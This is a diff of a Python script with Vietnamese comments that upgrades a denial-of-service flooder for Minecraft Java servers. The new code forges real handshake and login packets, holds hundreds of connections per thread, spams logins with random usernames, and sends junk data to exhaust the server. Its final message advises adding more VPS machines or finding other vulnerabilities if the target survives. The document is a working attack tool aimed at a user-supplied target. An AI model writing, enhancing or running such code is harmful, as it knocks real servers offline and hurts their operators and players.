@@ -1,168 +1,145 @@
 import os
-import subprocess
 import sys
-import importlib
 import socket
 import threading
 import time
 import random
+import struct
 from datetime import datetime
 from colorama import init, Fore, Style
 
 init(autoreset=True)
 
-required_modules = ['requests', 'colorama']
-
-def check_and_install_module(module_name):
-    try:
-        importlib.import_module(module_name)
-        return True
-    except ImportError:
-        try:
-            subprocess.check_call([sys.executable, '-m', 'pip', 'install', module_name],
-                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            return True
-        except:
-            return False
-
-if not all(check_and_install_module(m) for m in required_modules):
-    print(f"{Fore.RED}[!] Thiếu module bắt buộc. Thoát.")
-    sys.exit(1)
-
 def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
 
 BANNER = f"""
-{Fore.RED}███████╗██╗     ██╗ ██████╗ ██╗  ██╗██████╗ 
-██╔════╝██║     ██║██╔═══██╗██║ ██╔╝██╔══██╗
-███████╗██║     ██║██║   ██║█████╔╝ ██████╔╝
-╚════██║██║     ██║██║   ██║██╔═██╗ ██╔══██╗
-███████║███████╗██║╚██████╔╝██║  ██╗██████╔╝
-╚══════╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
-{Style.RESET_ALL}               SKI FLOOD - Enhanced 2025
+{Fore.RED}SKI TCP FLOOD - JAVA MODE 2026 - NO BOT NO UDP{Style.RESET_ALL}
+    Aggressive Handshake + Login Spam
 """
 
-def get_server_ip_port(server_address):
-    try:
-        if ':' in server_address:
-            host, port = server_address.rsplit(':', 1)
-            return socket.gethostbyname(host), int(port)
-        
-        import requests
-        res = requests.get(f'https://api.mcsrvstat.us/2/{server_address}', timeout=4).json()
-        if res.get('online'):
-            return res.get('ip'), int(res.get('port', 25565))
-        else:
-            return socket.gethostbyname(server_address), 25565
-    except:
-        try:
-            return socket.gethostbyname(server_address), 25565
-        except:
-            return None, None
+def varint(n):
+    out = bytearray()
+    while True:
+        byte = n & 0x7F
+        n >>= 7
+        out.append(byte | (0x80 if n else 0))
+        if not n:
+            break
+    return bytes(out)
 
-# Một số payload Minecraft giả lập (phiên bản 1.8–1.21)
-MINECRAFT_HANDSHAKE = lambda host, port: (
-    b'\x0F' + b'\x00' + b'\x09' + host.encode('utf-8') +
-    port.to_bytes(2, 'big') + b'\x01' + b'\x00'
-)
+def minecraft_handshake(host, port, protocol=767):  # 1.21.3 = 767, 1.21.4 ~768
+    # Handshake packet: ID 0x00
+    p = varint(protocol)  # protocol version
+    p += varint(len(host)) + host.encode('utf-8')
+    p += struct.pack('>H', port)
+    p += varint(2)  # next state: login
+    return varint(len(p)) + b'\x00' + p
 
-MINECRAFT_LOGIN = b'\x00\x00\x00\x00\x08Player' + random.randbytes(12)
+def minecraft_login(username_prefix="fuck"):
+    name = username_prefix + str(random.randint(10000, 999999))
+    p = varint(len(name)) + name.encode('utf-8')
+    # No properties (offline mode style)
+    return varint(len(p)) + b'\x00' + p
 
-MINECRAFT_PING = b'\x00\x01'
-
-def random_payload():
-    payloads = [
-        b'\x00' * random.randint(500, 4096),
-        MINECRAFT_HANDSHAKE("localhost", 25565) + random.randbytes(random.randint(16, 128)),
-        MINECRAFT_LOGIN + random.randbytes(32),
-        b'\xfe\x01' + random.randbytes(512),           # legacy ping
-        MINECRAFT_PING * random.randint(1, 5),
-    ]
-    return random.choice(payloads)
-
-def flood_worker(server_ip, server_port, duration, thread_id, stop_event):
-    connections = []
+def tcp_worker(ip, port, duration, thread_id, stop_event):
+    conns = []
     sent = 0
-    start_time = time.time()
-
-    while time.time() - start_time < duration and not stop_event.is_set():
+    start = time.time()
+    
+    while time.time() - start < duration and not stop_event.is_set():
         try:
-            # Mở mới hoặc tái sử dụng
-            if len(connections) < random.randint(8, 35):  # mỗi thread giữ 8–35 kết nối
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(1.2)
-                s.connect((server_ip, server_port))
-                connections.append(s)
-
-            # Gửi random payload
-            if connections:
-                conn = random.choice(connections)
-                payload = random_payload()
+            # Giữ 50-150 conn mỗi thread
+            target_conns = random.randint(50, 150)
+            while len(conns) < target_conns:
                 try:
-                    conn.sendall(payload)
-                    sent += 1
-                    if sent % 50 == 0:
-                        now = datetime.now().strftime('%H:%M:%S')
-                        print(f"{Fore.CYAN}[{now}] T{thread_id} | sent {sent:,} pkts{Style.RESET_ALL}")
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(0.5)  # thấp để reconnect nhanh
+                    s.connect((ip, port))
+                    conns.append(s)
+                    
+                    # Gửi handshake + login ngay
+                    host_str = f"localhost{random.randint(1,999)}"  # fake host
+                    hs = minecraft_handshake(host_str, port)
+                    login = minecraft_login()
+                    
+                    s.sendall(hs)
+                    time.sleep(0.01 + random.random()*0.03)  # nhỏ để giống thật
+                    s.sendall(login)
+                    
+                    sent += 2  # 1 handshake + 1 login
                 except:
-                    connections.remove(conn)
+                    pass  # fail thì skip, retry sau
+            
+            # Gửi thêm random data để giữ conn & tốn CPU server
+            if conns:
+                conn = random.choice(conns)
+                try:
+                    junk_size = random.randint(512, 16384)
+                    junk = random.randbytes(junk_size)
+                    conn.sendall(junk)
+                    sent += 1
+                except:
+                    conns.remove(conn)
                     conn.close()
-
+                
+                # Random close 10-20% để reconnect mới (tạo half-open)
+                if random.random() < 0.15:
+                    conns.remove(conn)
+                    conn.close()
+            
+            if sent % 1000 == 0:
+                now = datetime.now().strftime('%H:%M:%S')
+                rate = sent / (time.time() - start)
+                print(f"{Fore.CYAN}[{now}] T{thread_id} | {sent:,} pkts | ~{rate:.0f}/s{Style.RESET_ALL}")
+                
         except Exception:
-            time.sleep(0.03)  # tránh CPU 100% khi fail liên tục
-
+            time.sleep(0.003)  # tránh CPU 100% khi lỗi liên tục
+    
     # Cleanup
-    for s in connections:
-        try:
-            s.close()
-        except:
-            pass
-    print(f"{Fore.YELLOW}[T{thread_id}] stopped • total ~{sent:,} packets{Style.RESET_ALL}")
+    for c in conns:
+        try: c.close()
+        except: pass
+    print(f"{Fore.YELLOW}[T{thread_id}] STOP • Tổng ~{sent:,} packets{Style.RESET_ALL}")
+
+def resolve_target(target):
+    if ':' in target:
+        h, p = target.rsplit(':', 1)
+        return socket.gethostbyname(h), int(p)
+    return socket.gethostbyname(target), 25565
 
 def main():
     clear_screen()
     print(BANNER)
-
-    target = input(f"{Fore.YELLOW}[>] Target (ip/domain hoặc ip:port): {Style.RESET_ALL}").strip()
-    ip, port = get_server_ip_port(target)
-    if not ip:
-        print(f"{Fore.RED}Không resolve được địa chỉ.{Style.RESET_ALL}")
-        return
-
-    print(f"{Fore.GREEN}[+] Target → {ip}:{port}{Style.RESET_ALL}")
-
-    try:
-        duration = int(input(f"{Fore.YELLOW}[>] Thời gian (giây): {Style.RESET_ALL}"))
-        threads_cnt = int(input(f"{Fore.YELLOW}[>] Số threads (20–500): {Style.RESET_ALL}"))
-    except:
-        print(f"{Fore.RED}Giá trị không hợp lệ.{Style.RESET_ALL}")
-        return
-
-    print(f"\n{Fore.GREEN}→ Bắt đầu flood {ip}:{port} trong {duration}s với {threads_cnt} threads...{Style.RESET_ALL}\n")
-
-    stop_event = threading.Event()
-    threads = []
-
-    for i in range(threads_cnt):
-        t = threading.Thread(
-            target=flood_worker,
-            args=(ip, port, duration, i+1, stop_event),
-            daemon=True
-        )
+    
+    target = input(f"{Fore.YELLOW}[>] Target (ip hoặc domain:port): {Style.RESET_ALL}").strip()
+    ip, port = resolve_target(target)
+    print(f"{Fore.GREEN}[+] → {ip}:{port}{Style.RESET_ALL}")
+    
+    duration = int(input(f"{Fore.YELLOW}[>] Thời gian (giây, max 600): {Style.RESET_ALL}") or 300)
+    threads = int(input(f"{Fore.YELLOW}[>] Threads (100–800, thử 300+): {Style.RESET_ALL}") or 300)
+    
+    print(f"\n{Fore.RED}→ TCP FLOOD BẮT ĐẦU → handshake + login spam aggressive...{Style.RESET_ALL}\n")
+    
+    stop = threading.Event()
+    ths = []
+    
+    for i in range(threads):
+        t = threading.Thread(target=tcp_worker, args=(ip, port, duration, i+1, stop), daemon=True)
         t.start()
-        threads.append(t)
-
+        ths.append(t)
+    
     try:
-        time.sleep(duration + 2)
-        stop_event.set()
+        time.sleep(duration + 4)
+        stop.set()
     except KeyboardInterrupt:
-        print(f"\n{Fore.RED}Ctrl+C → Dừng sớm...{Style.RESET_ALL}")
-        stop_event.set()
-
-    for t in threads:
-        t.join(timeout=1.5)
-
-    print(f"\n{Fore.GREEN}Hoàn tất. Đã cố gắng gửi hàng chục → hàng trăm nghìn packet mỗi giây.{Style.RESET_ALL}")
+        print(f"\n{Fore.RED}Dừng tay...{Style.RESET_ALL}")
+        stop.set()
+    
+    for t in ths:
+        t.join(timeout=2)
+    
+    print(f"\n{Fore.GREEN}XONG. Tổng packet gửi cực lớn. Nếu vẫn không sập → server có TCPShield/Velocity + rate-limit mạnh. Cần nhiều máy/VPS hơn hoặc tìm lỗ hổng khác.{Style.RESET_ALL}")
 
 if __name__ == "__main__":
     main()
